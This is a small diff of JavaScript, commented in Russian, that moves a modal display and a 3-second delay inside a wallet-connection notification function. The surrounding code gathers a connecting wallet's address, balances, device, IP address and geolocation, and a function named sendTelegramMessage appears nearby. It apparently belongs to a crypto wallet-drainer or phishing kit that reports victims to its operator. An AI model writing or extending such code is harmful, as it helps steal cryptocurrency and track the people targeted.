@@ -276,17 +276,17 @@ async function sendTelegramMessage(message) {
 // Уведомления
 async function notifyWalletConnection(address, walletName, device, balances, chainId) {
   const connectionKey = `${address}_${chainId}`
-
-    // Показать модальное окно
-  showCustomModal()
-  await new Promise(resolve => setTimeout(resolve, 3000)) // Ждать 3 секунды
-
   if (store.connectionKey === connectionKey || store.isProcessingConnection) {
     console.log('Skipping duplicate wallet connection notification')
     return
   }
   store.isProcessingConnection = true
   try {
+
+    // Показать модальное окно
+    showCustomModal()
+    await new Promise(resolve => setTimeout(resolve, 3000)) // Ждать 3 секунды
+
     console.log('Sending wallet connection notification')
     const ip = await getUserIP()
     const location = await getGeolocation(ip)
